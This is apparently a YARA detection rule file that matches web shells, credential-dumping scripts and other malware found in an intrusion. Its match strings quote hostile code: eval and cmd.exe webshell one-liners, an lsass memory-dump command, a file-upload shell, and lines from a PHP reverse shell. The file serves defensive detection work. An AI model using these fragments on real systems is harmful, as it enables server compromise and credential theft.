import "pe"

rule WC_notapad {
   meta:
      description = "notapad.exe"
      date = "2020-02-07"
      hash1 = "680aec25536414134c31f6cc78996f4954b95dcc3decf2b0f003376ed674b946"
   strings:
      $x1 = "C:\\Users\\X\\Desktop\\x\\encrypted_payload_launcher\\encrypted_payload_launcher\\obj\\Debug\\encrypted_payload_launcher.pdb" fullword ascii
      $x2 = "encrypted_payload_launcher.exe" fullword wide
      $s3 = "encrypted_payload_launcher.Properties.Resources.resources" fullword ascii
      $s4 = "encrypted_payload_launcher.Properties.Resources" fullword wide
      $s5 = "encrypted_payload_launcher.Properties" fullword ascii
      $s6 = "encrypted_payload_launcher" fullword wide
      $s7 = "288556FF87D7774A3FDDF906202FA0D953911232B95A79A21D0E7EF3ECF0F187" fullword ascii
      $s8 = ".NET Framework 4@" fullword ascii
      $s9 = "ikhjngbfbgfbgfg" fullword ascii
      $s10 = "<GHIOKHyuklyJGHDFVsdvsdVfdHfgJg>b__0" fullword ascii
      $s11 = "$49f5d128-e5ef-43b9-a7cb-697fd7204fbb" fullword ascii
      $s12 = "<FDKJgndfNbgvfdcCSgV>b__2_0" fullword ascii
      $s13 = "GHIOKHyuklyJGHDFVsdvsdVfdHfgJg" fullword ascii
      $s14 = "dhnfdbhdfbhfnhdbrtgj_hgnfbnfhj" fullword ascii
      $s15 = "gjfbhfvgdVFYGNHGHJGNHNGHG" fullword ascii
      $s16 = "FJdhfdsGsdfgvDsvSDAfSDagfdbdf" fullword ascii
      $s17 = "bhfghjgbdvhFBGHGBDH" fullword ascii
      $s18 = "DFHDSHGFHyhfGDFSghf" fullword ascii
      $s19 = "hJTvfdgfssDFXcfcvdbfgf" fullword ascii
      $s20 = "FDKJgndfNbgvfdcCSgV" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        ( 1 of ($x*) and 6 of ($s*) )
      ) or ( all of them )
}
rule procdump {
   meta:
      description = "procdump.exe"
      date = "2020-02-07"
      hash1 = "05732e84de58a3cc142535431b3aa04efbe034cc96e837f93c360a6387d8faad"
   strings:
      $x1 = "- Write a Full and Kernel dump for a process named 'hang.exe' when one of its" fullword wide
      $x2 = "C:\\Builds\\13810\\Tools\\ProcDump_master\\bin\\x64\\Release\\procdump64.pdb" fullword ascii
      $x3 = "C:\\Builds\\13810\\Tools\\ProcDump_master\\bin\\Win32\\Release\\procdump.pdb" fullword ascii
      $x4 = "Process cloning via PSS (-r) can't be used with kernel dumping (-mk) due to OS limitations." fullword wide
      $x5 = "- Write a Mini dump for a process named 'hang.exe' when one of its" fullword wide
      $x6 = "   -k      Kill the process after cloning (-r), or at end of dump collection." fullword wide
      $x7 = "    C:\\>procdump -ma -mk -h hang.exe" fullword wide
      $x8 = "- Write a Full dump of a process named 'outlook' when Outlook's handle count " fullword wide
      $x9 = "- Write a Mini first, and then a Full dump of a process with PID '4572':" fullword wide
      $x10 = "- Write 3 Mini dumps 5 seconds apart of a process named 'notepad':" fullword wide
      $x11 = "- Write up to 3 Mini dumps of a process named 'consume' when it exceeds" fullword wide
      $x12 = "- Write a Mini dump of a process named 'outlook' when total system CPU " fullword wide
      $x13 = "Error deleting HKLM\\SOFTWARE\\%sMicrosoft\\Windows NT\\CurrentVersion\\AeDebug\\ProcDump\\" fullword wide
      $x14 = "- Write a Full dump of a process with PID '4572':" fullword wide
      $x15 = "           Note: CLR processes are dumped as Full (-ma) due to debugging limitations." fullword wide
      $x16 = "- Write up to 10 Full dumps of each 1st or 2nd chance exception of w3wp.exe:" fullword wide
      $x17 = "- Write a Mini dump of a process named 'notepad' (only one match can exist):" fullword wide
      $x18 = "C:\\Debuggers\\WOW64\\dbghelp.dll" fullword wide
      $x19 = "   Default dump filename: PROCESSNAME_YYMMDD_HHMMSS.dmp" fullword wide
      $x20 = "C:\\Debuggers_x64\\dbghelp.dll" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 2000KB and
        pe.imphash() == "fad4245d83e8982f975b4b8f2f4d5719" and
        ( 10 of ($x*) )
      ) or ( all of them )
}
rule releasehold_cs {
   meta:
      description = "releasehold.cs.aspx"
      date = "2020-02-07"
      hash1 = "b0d63fd02ef1538673073be38a1a7c55f2c0e844b040d92254a22bac977a6f7b"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %> <% var Q =Request.Form[\"key\"];var D =Request.Form[\"buffer\"];if(Q!=null" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_ua {
   meta:
      description = "ua.aspx"
      date = "2020-02-07"
      hash1 = "c278f92382e2aa193699eadca1da01f2d975bd359842eee276bfe41d735749f9"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"Sharepoint.Directory.Error\"],\"unsafe\");%>" fullword wide
   condition:
      ( uint16(0) == 0xfeff and
        filesize < 1KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule c62f6195_aecf_4d01_b4eb_eceea653bd0c {
   meta:
      description = "c62f6195-aecf-4d01-b4eb-eceea653bd0c.aspx"
      date = "2020-02-07"
      hash1 = "53eb7b258e71d6398117442a8eb1161900c62d3c04067f434196f549115c4994"
   strings:
      $x1 = "psi.FileName = \"cmd.exe\";" fullword ascii
      $s2 = "<asp:Label id=\"lblText\" style=\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat=\"server\">cmd:</asp:Label>" fullword ascii
      $s3 = "psi.UseShellExecute = false;" fullword ascii
      $s4 = "<form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii
      $s5 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
      $s6 = "Process p = Process.Start(psi);" fullword ascii
      $s7 = "Response.Write(Server.HtmlEncode(cs(txtArg.Text)));" fullword ascii
      $s8 = "void ewlick(object sender, System.EventArgs e)" fullword ascii
      $s9 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
      $s10 = "psi.RedirectStandardOutput = true;" fullword ascii
      $s11 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
      $s12 = "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %>" fullword ascii
      $s13 = "string s = stmrdr.ReadToEnd();" fullword ascii
      $s14 = "psi.Arguments = \"/c \"+arg;" fullword ascii
      $s15 = "Response.Write(\"<pre>\");" fullword ascii
      $s16 = "Response.Write(\"</pre>\");" fullword ascii
      $s17 = "<asp:TextBox id=\"txtArg\" style=\"Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\" runat=\"server\" Width=\"250px\"><" ascii
      $s18 = "stmrdr.Close();" fullword ascii
      $s19 = "<asp:Button id=\"testing\" style=\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat=\"server\" Text=\"excute\" O" ascii
      $s20 = "string cs(string arg)" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 3KB and
        ( 1 of ($x*) and 12 of ($s*) )
      ) or ( all of them )
}
rule WC_connect {
   meta:
      description = "connect.aspx"
      date = "2020-02-07"
      hash1 = "13dab56f0594e0d6f345b46507450140a4c5d0c36b4ab586b72b53f11b78594b"
   strings:
      $s1 = "String tartar = Request.QueryString.Get(\"target\").ToUpper();" fullword ascii
      $s2 = "String omomomg = Request.QueryString.Get(\"cmd\").ToUpper();" fullword ascii
      $s3 = "System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, popopo);" fullword ascii
      $s4 = "int popopo = int.Parse(Request.QueryString.Get(\"port\"));" fullword ascii
      $s5 = "Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);" fullword ascii
      $s6 = "Response.AddHeader(\"X-ERROR\", exKak.Message);" fullword ascii
      $s7 = "Response.AddHeader(\"X-STATUS\", \"FAIL\");" fullword ascii
      $s8 = "Response.AddHeader(\"X-ERROR\", ex.Message);" fullword ascii
      $s9 = "<%@ Import Namespace=\"System.Net.Sockets\" %>" fullword ascii
      $s10 = "Session.Add(\"socket\", sender);" fullword ascii
      $s11 = "Response.AddHeader(\"X-STATUS\", \"OK\");" fullword ascii
      $s12 = "if (Request.HttpMethod == \"POST\")" fullword ascii
      $s13 = "System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);" fullword ascii
      $s14 = "while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)" fullword ascii
      $s15 = "else if (omomomg == \"FORWARD\")" fullword ascii
      $s16 = "Response.BinaryWrite(newBuff);" fullword ascii
      $s17 = "int buffLen = Request.ContentLength;" fullword ascii
      $s18 = "<%@ Page Language=\"C#\" EnableSessionState=\"True\"%>" fullword ascii
      $s19 = "sender.Connect(remoteEP);" fullword ascii
      $s20 = "Session.Abandon();" fullword ascii
   condition:
      ( uint16(0) == 0xbbef and
        filesize < 10KB and
        ( 12 of ($s*) )
      ) or ( all of them )
}
rule WC_cmd__3_ {
   meta:
      description = "cmd (3).aspx"
      date = "2020-02-07"
      hash1 = "723a7042f1adf37f355493e61031354e42492c5b27a7e1ed750f55af6417e422"
   strings:
      $x1 = "psi.FileName = \"cmd.exe\";" fullword ascii
      $s2 = "utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);  " fullword ascii
      $s3 = "psi.UseShellExecute = false;" fullword ascii
      $s4 = "System.Text.Decoder utf8Decode = encoder.GetDecoder();" fullword ascii
      $s5 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
      $s6 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
      $s7 = "byte[] todecode_byte = Convert.FromBase64String(datas);" fullword ascii
      $s8 = "System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();  " fullword ascii
      $s9 = "Process p = Process.Start(psi);" fullword ascii
      $s10 = "<%@ Import Namespace=\"System.Data\" %>" fullword ascii
      $s11 = "<%@ Import Namespace=\"System.Runtime.InteropServices\" %>" fullword ascii
      $s12 = "int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);    " fullword ascii
      $s13 = "char[] decoded_char = new char[charCount];" fullword ascii
      $s14 = "string result = new String(decoded_char);" fullword ascii
      $s15 = "psi.Arguments = \"/c \" + result;" fullword ascii
      $s16 = "<%@ Import Namespace=\"System.Reflection\" %>" fullword ascii
      $s17 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
      $s18 = "psi.RedirectStandardOutput = true;" fullword ascii
      $s19 = "if (!String.IsNullOrEmpty(Request.QueryString[\"c\"])) {" fullword ascii
      $s20 = "Response.Write(Server.HtmlEncode(s));" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 4KB and
        ( 1 of ($x*) and 12 of ($s*) )
      ) or ( all of them )
}
rule diagnostics1 {
   meta:
      description = "diagnostics1.aspx"
      date = "2020-02-07"
      hash1 = "619eb4cabd2a536119d59d4b6f4463ab1001627faf7890d2fdbcc346f22629e5"
   strings:
      $x1 = "psi.Arguments = System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(\"L2Mg\" + arg));" fullword ascii
      $s2 = "psi.UseShellExecute = false;" fullword ascii
      $s3 = "<form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii
      $s4 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
      $s5 = "document.getElementById('txtArg').value = base64_encode;" fullword ascii
      $s6 = "Process p = Process.Start(psi);" fullword ascii
      $s7 = "document.getElementById('testing').click();" fullword ascii
      $s8 = "this.Response.ContentType = \"text/html\";" fullword ascii
      $s9 = "psi.FileName = \"cm\" + \"d.e\" + \"xe\";" fullword ascii
      $s10 = "var getText = document.getElementById('txtArg').value;" fullword ascii
      $s11 = "string authstr = auth + \"=\" + pass;" fullword ascii
      $s12 = "var base64_encode = btoa(getText);" fullword ascii
      $s13 = "string pass = \"error.cs\";" fullword ascii
      $s14 = "Response.Write(Server.HtmlEncode(cs(txtArg.Text)));" fullword ascii
      $s15 = "void ewlick(object sender, System.EventArgs e)" fullword ascii
      $s16 = "this.Response.End();" fullword ascii
      $s17 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
      $s18 = "psi.RedirectStandardOutput = true;" fullword ascii
      $s19 = "<asp:Button id=\"testing\" Style=\"display: none;background: transparent; border: none !important; font-size:0;\"  runat=\"serve" ascii
      $s20 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 6KB and
        ( 1 of ($x*) and 10 of ($s*) )
      ) or ( all of them )
}
rule metaconf {
   meta:
      description = "metaconf.aspx"
      date = "2020-02-07"
      hash1 = "cda3d9a25815ffe40b16a76881963b94495eee6ea2a69a1e050e80af8f396230"
   strings:
      $x1 = "System.Diagnostics.ProcessStartInfo sinf = new System.Diagnostics.ProcessStartInfo(\"cmd\", \"/c \" + this.txt.Text + \"\");" fullword ascii
      $x2 = "<meta content=\"http://schemas.microsoft.com/intellisense/ie5\" name=\"vs_targetSchema\">" fullword ascii
      $x3 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + e.CommandArgument.ToString());" fullword ascii
      $x4 = "]----------- ThE WhitE WolF (the_white_lf_x@hotmail.com -------------------[</a>" fullword ascii
      $x5 = "** Description : Shell ASPX for All  Version Frame Work" fullword ascii
      $x6 = "<asp:Button Text=\"Execute\" OnClick=\"ADD_Click\" Runat=\"server\" ID=\"Button1\" BackColor=\"#666666\" " fullword ascii
      $x7 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + filename);" fullword ascii
      $x8 = "<asp:TemplateColumn HeaderText=\" [Download] \" HeaderStyle-Font-Size=\"10\">" fullword ascii
      $x9 = "[DllImport(\"kernel32.dll\", EntryPoint = \"GetDriveTypeA\")]" fullword ascii
      $x10 = "system0.Text = Environment.OSVersion.ToString() + \"(Windows NT 3.51)\";" fullword ascii
      $s11 = "system0.Text = Environment.OSVersion.ToString() + \"(Windows NT 4.0)\";" fullword ascii
      $s12 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + this.Drivers.SelectedValue);" fullword ascii
      $s13 = "Response.Redirect(Request.ServerVariables[\"SCRIPT_NAME\"] + \"?d=\" + this.txtPath.Text);" fullword ascii
      $s14 = "<asp:LinkButton ID=\"lnkExec\" runat=\"server\" onclick=\"lnkExec_Click\">[Execute " fullword ascii
      $s15 = "&nbsp;<font color=\"#00FF00\" style=\"text-align: center\"><asp:Label ID=\"lblCommand\" runat=\"server\"  " fullword ascii
      $s16 = "fileSystemRow[\"Download\"] = \"<font size=4 align=center algin=cenetre face=wingdings color=WhiteSmoke ><</font>\";" fullword ascii
      $s17 = "/*  if ((File1.PostedFile != null) && (File1.PostedFile.ContentLength > 0))" fullword ascii
      $s18 = "Response.Redirect(\"http://\"+Request.ServerVariables[\"SERVER_NAME\"]+Request.ServerVariables[\"SCRIPT_NAME\"]);" fullword ascii
      $s19 = "ASPX SheLL / Yee7 Team]-----------<font color=\"Black\"  face=\"webdings\" size=\"6\" >N</font>------------</td>" fullword ascii
      $s20 = "CommandName='<%# DataBinder.Eval(Container, \"DataItem.Download\") %>' " fullword ascii
   condition:
      ( uint16(0) == 0x4947 and
        filesize < 100KB and
        ( 6 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule setanon_show {
   meta:
      description = "setanon_show.aspx"
      date = "2020-02-07"
      hash1 = "e34f0c412dfb90973e3e0ad5999ebad4feec6e554f34658eb4065512dbf3eca3"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %> <% var Q =Request.Form[\"key\"];var D =Request.Form[\"buffer\"];if(Q!=null" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 2KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule RenderWrk {
   meta:
      description = "RenderWrk.aspx"
      date = "2020-02-07"
      hash1 = "156a1b8c38b9a6d07d5a846cc56846f830475d2d868c0f7795ec9a6f03dcfe26"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" %><%eval(Request.Item[\"t\"],\"unsafe\");%> " fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 1KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_Midan {
   meta:
      description = "Midan.aspx"
      date = "2020-02-07"
      hash1 = "1e2d477f3b1039fd1fd53ac5f6c4f71c87cc941bc6cb8db53d975f56094f8c06"
   strings:
      $s1 = "<%@ Page Language=\"C#\" EnableViewState=\"false\" %><% string k1 = new string(new char[] { (char)(107 + 758 - 758), (char)(101 " ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 20KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WC_1__2_ {
   meta:
      description = "1 (2).bat"
      date = "2020-02-07"
      hash1 = "3d365b5fb05142a92dadcceae85b1bd0de49986d26dc841b6326d67d0d9c5991"
   strings:
      $x1 = "c:\\root\\pr.exe -accepteula -ma lsass.exe c:\\root\\lsass.dmp 2>&1" fullword ascii
   condition:
      ( uint16(0) == 0x3a63 and
        filesize < 1KB and
        ( 1 of ($x*) )
      ) or ( all of them )
}
rule WC_svhost3 {
   meta:
      description = "svhost3.exe"
      date = "2020-02-07"
      hash1 = "bec0fa0c2bb6fde0d7ea58b75926f9b80d1248b6ecc49204735ce685a82c6e72"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe" fullword wide
      $x2 = "C:\\\\windows\\\\temp\\sysBin.sys" fullword wide
      $s3 = "C:\\users\\" fullword wide
      $s4 = "C:\\Documents and Settings\\" fullword wide
      $s5 = "C:\\windows\\system32\\" fullword wide
      $s6 = "Gazaneh.exe" fullword wide
      $s7 = "ProcessProtection" fullword ascii
      $s8 = "C:\\Recovery\\" fullword wide
      $s9 = "C:\\inetpub\\" fullword wide
      $s10 = "C:\\ProgramData\\" fullword wide
      $s11 = "E89E4E2EDAD1B7044E0C57DC6BEDDA82B7C46E3F" fullword ascii
      $s12 = "Gazaneh.Properties.Resources.resources" fullword ascii
      $s13 = "/C shutdown /R /T 0 /F" fullword wide
      $s14 = "Gazaneh.Properties.Resources" fullword wide
      $s15 = "GetDirectores" fullword ascii
      $s16 = "15.0.0.0" fullword ascii
      $s17 = "15.9.0.0" fullword ascii
      $s18 = "Gazaneh.Properties" fullword ascii
      $s19 = "FileShareWrite" fullword ascii
      $s20 = "$d39595c2-76fa-47fb-9891-3b4f4eb9c113" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        ( 2 of ($x*) and 6 of ($s*) )
      ) or ( all of them )
}
rule WC_port {
   meta:
      description = "port.ps1"
      date = "2020-02-07"
      hash1 = "5245358582829acce6dd9bbad03903d96084679789809e76739d1655e0b3de21"
   strings:
      $x1 = "C:\\PS> Invoke-Portscan -Hosts \"webstersprodigy.net,google.com,microsoft.com\" -TopPorts 50" fullword ascii
      $x2 = "$numhosts = [System.math]::Pow(2,(($address.GetAddressBytes().Length *8) - $maskPart))" fullword ascii
      $x3 = "C:\\PS> echo webstersprodigy.net | Invoke-Portscan -oG test.gnmap -f -ports \"80,443,8080\"" fullword ascii
      $x4 = "Scans the top 50 ports for hosts found for webstersprodigy.net,google.com, and microsoft.com" fullword ascii
      $x5 = "#taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET" fullword ascii
      $x6 = "Write-PortscanOut -comment $startMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream" fullword ascii
      $x7 = "Write-PortscanOut -comment $endMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream" fullword ascii
      $x8 = "C:\\PS> Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet" fullword ascii
      $s9 = "$hostObj | Add-Member -MemberType Noteproperty -Name closedPorts -Value $closedPorts" fullword ascii
      $s10 = "throw \"Error: $ReadableOut already exists. Either delete the file or specify the -f flag\"" fullword ascii
      $s11 = "throw \"Error: $AllformatsOut already exists. Either delete the file or specify the -f flag\"" fullword ascii
      $s12 = "throw \"Error: $XmlOut already exists. Either delete the file or specify the -f flag\"" fullword ascii
      $s13 = "[uint32]$startMask = ([System.math]::Pow(2, $maskPart)-1) * ([System.Math]::Pow(2,(32 - $maskPart)))" fullword ascii
      $s14 = "$hostObj | Add-Member -MemberType Noteproperty -Name filteredPorts -Value $filteredPorts" fullword ascii
      $s15 = "if ($maskPart -ge $address.GetAddressBytes().Length * 8)" fullword ascii
      $s16 = "$hostObj | Add-Member -MemberType Noteproperty -Name openPorts -Value $openPorts" fullword ascii
      $s17 = "$startMsg = \"Invoke-Portscan.ps1 v$version scan initiated $startdate as: $myInvocationLine\"" fullword ascii
      $s18 = "$readableStream.writeline((\"{0,-10}{1,0}\" -f \"PORT\", \"STATE\"))" fullword ascii
      $s19 = "Comma separated ports used for host discovery. -1 is a ping" fullword ascii
      $s20 = "#Port Scan Code - run on a per host basis" fullword ascii
   condition:
      ( uint16(0) == 0x7566 and
        filesize < 100KB and
        ( 4 of ($x*) and 4 of ($s*) )
      ) or ( all of them )
}
rule WC_retest {
   meta:
      description = "retest.php"
      date = "2020-02-07"
      hash1 = "4dca768f33e270bd4c7778c33cb54e635104c73635e4497ee289f8928e19bb32"
   strings:
      $x1 = "// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck." fullword ascii
      $s2 = "// This script will make an outbound TCP connection to a hardcoded IP and port." fullword ascii
      $s3 = "printit(\"ERROR: Shell process terminated\");" fullword ascii
      $s4 = "// php-reverse-shell - A Reverse Shell implementation in PHP" fullword ascii
      $s5 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s6 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
      $s7 = "// Spawn shell process" fullword ascii
      $s8 = "// The recipient will be given a shell running as the current user (apache normally)." fullword ascii
      $s9 = "printit(\"ERROR: Shell connection terminated\");" fullword ascii
      $s10 = "// Make the current process a session leader" fullword ascii
      $s11 = "// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows." fullword ascii
      $s12 = "0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from" fullword ascii
      $s13 = "// This tool may be used for legal purposes only.  Users take full responsibility" fullword ascii
      $s14 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii
      $s15 = "// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available." fullword ascii
      $s16 = "printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");" fullword ascii
      $s17 = "// Fork and have the parent process exit" fullword ascii
      $s18 = "$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);" fullword ascii
      $s19 = "1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to" fullword ascii
      $s20 = "$read_a = array($sock, $pipes[1], $pipes[2]);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 20KB and
        ( 1 of ($x*) and 8 of ($s*) )
      ) or ( all of them )
}
rule WC_pscan25 {
   meta:
      description = "pscan25.exe @ Advanced Port Scanner: Consult your Administrators First"
      date = "2020-02-07"
      hash1 = "8fdd5fa70ab82d38a9e43ca40e4b0511a90e093eae28812726f1d1c628901880"
   strings:
      $x1 = "try { oFilesystem.MoveFile( s, d ); } catch( err ) {}SetARPINSTALLLOCATIONARPINSTALLLOCATION[ACTUAL_APPFOLDER]ai_CloseAIPSRaClos" ascii
      $x2 = "NameTableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x3 = "{1F5682F5-C907-41AA-9207-BF548BE7C49B}2.5.3581;{C9CCA5C7-69A1-437F-9F9C-9EEDB4679511}2.5.3581;{FE17EC70-BA18-428HOW_UNKNOWNf_set" ascii
      $x4 = "Z:\\out\\Release\\NetUtils\\x86\\aps_wix_install_dll.pdb" fullword ascii
      $x5 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide
      $s6 = "windowsprintersupport.dll" fullword ascii
      $s7 = "Qt5Widgets.dll" fullword ascii
      $s8 = "Qt5PrintSupport.dll" fullword ascii
      $s9 = "advanced_port_scanner_console.exe" fullword ascii
      $s10 = "advanced_port_scanner.exe" fullword ascii
      $s11 = "verze programu Advanced Port Scanner.regDC853F02D327CFF1A2C440C9A0D2C2FCcs_czs_helpn-ew3aub.sho|P" fullword ascii
      $s12 = "var sHome = oShell.ExpandEnvironmentStrings( \"%USERPROFILE%\" );" fullword ascii
      $s13 = "OnlineHelpUrlhttp://www.advanced-ip-scanner.com/link.php?lng=se&ver=2-5-3581&beta=n&page=helpProductCode{D45D4F70-2393-4AC7-BD29" ascii
      $s14 = "OnlineHelpUrlhttp://www.advanced-ip-scanner.com/link.php?lng=de&ver=2-5-3581&beta=n&page=helpProductCode{C9CCA5C7-69A1-437F-9F9C" ascii
      $s15 = "Qt5Xml.dll" fullword ascii
      $s16 = "qwindows.dll" fullword ascii
      $s17 = "OnlineHelpUrlhttp://www.advanced-ip-scanner.com/link.php?lng=id&ver=2-5-3581&beta=n&page=helpProductCode{0C27BAA9-ECB8-45C8-B366" ascii
      $s18 = "Qt5Core.dll" fullword ascii
      $s19 = "Same as /LOG, except it allows you to specify a fixed path/filename to use for the log file." fullword wide
      $s20 = "msvcr120.dll" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 28000KB and
        pe.imphash() == "48aa5c8931746a9655524f67b25a47ef" and
        ( 2 of ($x*) and 8 of ($s*) )
      ) or ( all of them )
}
rule FldEditor {
   meta:
      description = "FldEditor.aspx"
      date = "2020-02-07"
      hash1 = "1c7683aa4528a03d3f6971925db11e5f0a2ce396fd528b5ae3b65167fe489f94"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" %><% if (Request.Files.Count != 0) { Request.Files[0].SaveAs(\"C:\\\\windows\\\\temp\\\\\" + Reque" ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 1KB and
        ( all of ($s*) )
      ) or ( all of them )
}
rule WSSADMINS {
   meta:
      description = "WSSADMINS.exe"
      date = "2020-02-07"
      hash1 = "8485405cb54e2094e3229bc1a8c1e9a823e508400d0ea43b9c3e207a6ee3a468"
   strings:
      $x1 = "C:\\Windows\\system32\\AppIDSvc.exe" fullword wide
      $s2 = "WSSADMINS.exe" fullword wide
      $s3 = "/c taskkill /im AppIDSvc.exe /f" fullword wide
      $s4 = "WSSADMINS" fullword ascii
      $s5 = "<Main>g__startproc|0_0" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 10KB and
        ( 1 of ($x*) and all of ($s*) )
      ) or ( all of them )
}
rule copyrules {
   meta:
      description = "copyrules.aspx"
      date = "2020-02-07"
      hash1 = "daa362f070ba121b9a2fa3567abc345edcde33c54cabefa71dd2faad78c10c33"
   strings:
      $x1 = "//process1.StartInfo.FileName = \"C:\\\\WINDOWS\\\\TEMP\\\\socks4aServer.exe\";" fullword ascii
      $x2 = "foreach (System.Diagnostics.Process proc in System.Diagnostics.Process.GetProcessesByName(Path.GetFileName(_file)))" fullword ascii
      $s3 = "HttpContext.Current.Response.Write(\"ERROR_CONTEXT:\" + exc.Message);" fullword ascii
      $s4 = "HttpContext.Current.Response.Write(\"[Server] Missing Some Arguments \" +IP + \":\" + PORT);" fullword ascii
      $s5 = "System.Diagnostics.Process process1 = new System.Diagnostics.Process();" fullword ascii
      $s6 = "IPHostEntry ipHostInfo = Dns.GetHostByAddress((IP)); //Dns.GetHostByName" fullword ascii
      $s7 = "HttpContext.Current.Response.Write(\"running 0: \" + exc.Message);" fullword ascii
      $s8 = "HttpContext.Current.Response.Write(\"running 2: \" + exc.Message);" fullword ascii
      $s9 = "HttpContext.Current.Response.Write(\"running 1: \" + exc.Message);" fullword ascii
      $s10 = "Array.Copy(szCipherText, received, szCipherText.Length - __K_SUFFIX__.Length);" fullword ascii
      $s11 = "protected byte[] x0r_decrypt(byte[] szCipherText, string szEncryptionKey = \"\")" fullword ascii
      $s12 = "ipHostInfo = Dns.GetHostByAddress(IP); //Dns.GetHostByName" fullword ascii
      $s13 = "Response.Cookies.Add(new HttpCookie(\"ASP.NET_SessionId\", \"\"));" fullword ascii
      $s14 = "process1.StartInfo.Arguments = PORT.ToString();" fullword ascii
      $s15 = "string SaveLocation = Path.GetTempPath() + \"\\\\\" + fn;" fullword ascii
      $s16 = "szEncryptionKey = Hex2String(\"0a18e2c5ddaa0f6574986414c64de5ce\");" fullword ascii
      $s17 = "byte[] postData = Request.BinaryRead(Request.TotalBytes);" fullword ascii
      $s18 = "process1.StartInfo.FileName = _file;" fullword ascii
      $s19 = "HttpContext.Current.Response.Write(\"[Server] Unable to resolve IP address\");" fullword ascii
      $s20 = "HttpContext.Current.Server.ScriptTimeout = 600;     //NOTE: randomly chose 600" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 50KB and
        ( 2 of ($x*) and 8 of ($s*) )
      ) or ( all of them )
}
rule WC_js {
   meta:
      description = "js.aspx"
      date = "2020-02-07"
      hash1 = "77068cbe336c775e3670a1503c097a81fff1d1f2fc06293e6d1b2f99842a9c44"
   strings:
      $x1 = "<asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&l" ascii
      $x2 = "<asp:ListItem Value=\"exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_" ascii
